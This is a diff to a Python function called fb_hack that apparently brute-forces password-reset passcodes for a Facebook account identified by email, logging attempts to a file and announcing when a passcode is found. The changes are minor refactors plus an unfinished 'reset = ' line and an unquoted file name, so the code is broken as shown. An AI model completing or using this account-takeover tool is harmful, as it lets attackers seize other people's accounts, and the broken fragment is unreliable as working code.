@@ -171,7 +171,7 @@ def fb_hack(email, codex):
       fail = (y, "failed")
       success = (y, "succeded")
       s = " "
-      reset = reset - 1
+      reset -= 1
       reset1 = reset
       with open("passcoder.txt", "a") as z:
         z.write(str(reset1))
@@ -203,8 +203,8 @@ def fb_hack(email, codex):
       fail = (y, "failed")
       success = (y, "succeded")
       s = " "
-      reset1 = reset - 1
-      reset = reset1
+      reset -= 1
+      reset1 = reset
       with open(passcoder.txt, "a") as z:
         z.write(str(reset1))
         z.close()
@@ -224,12 +224,15 @@ def fb_hack(email, codex):
         else:
           print(s.join(success))
   else:
+    reset = 
+
+
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print(browser.geturl())
     if soup.find(string="password_new") == test:
-      print("Password not found")
-      browser.close()
+      print("Passcode not found")
+      raise
     else:
       print("Passcode found!")
       print(y)
